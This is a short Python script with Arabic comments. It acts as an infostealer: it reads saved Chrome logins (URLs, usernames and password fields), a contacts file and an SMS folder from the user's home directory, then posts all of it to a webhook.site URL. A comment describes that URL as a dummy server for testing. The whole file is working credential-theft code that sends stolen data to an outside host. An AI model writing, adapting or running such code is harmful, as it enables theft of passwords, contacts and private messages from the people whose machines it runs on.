import os
import sqlite3
import requests
import shutil

# 1. جمع بيانات المتصفح (Chrome)
def collect_browser_data():
    browser_data = ""
    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
    
    if os.path.exists(chrome_path):
        conn = sqlite3.connect(chrome_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            origin_url, username, password = row
            browser_data += f"URL: {origin_url}, Username: {username}, Password: {password}\n"
        conn.close()
    
    return browser_data

# 2. جمع بيانات جهات الاتصال (يمكنك تعديلها لتناسب تطبيقات أخرى)
def collect_contacts():
    contacts = ""
    contacts_file = os.path.expanduser("~\\Contacts")
    
    if os.path.exists(contacts_file):
        with open(contacts_file, "r") as f:
            contacts = f.read()  # قراءة محتويات جهات الاتصال
    
    return contacts

# 3. جمع الرسائل النصية (من مجلدات النصوص أو التطبيقات المثبتة)
def collect_sms():
    sms = ""
    sms_folder = os.path.expanduser("~\\Documents\\SMS")
    
    if os.path.exists(sms_folder):
        for filename in os.listdir(sms_folder):
            with open(os.path.join(sms_folder, filename), "r") as f:
                sms += f.read()  # قراءة الرسائل النصية
    
    return sms

# 4. رفع البيانات إلى الخادم
def upload_data(data):
    server_url = "https://webhook.site/457d6ea3-5a8a-4186-b8b7-5c50ac4f1881"  # استخدم عنوان خادم وهمي للتجربة
    try:
        response = requests.post(server_url, data=data)
        if response.status_code == 200:
            print("Data uploaded successfully.")
        else:
            print(f"Failed to upload data. Response code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error during upload: {e}")

# 5. جمع جميع البيانات وإرسالها
def collect_and_send_data():
    browser_data = collect_browser_data()
    contacts_data = collect_contacts()
    sms_data = collect_sms()

    # دمج جميع البيانات
    all_data = f"Browser Data:\n{browser_data}\nContacts Data:\n{contacts_data}\nSMS Data:\n{sms_data}"

    # رفع البيانات إلى الخادم
    upload_data(all_data)

if __name__ == "__main__":
    collect_and_send_data()
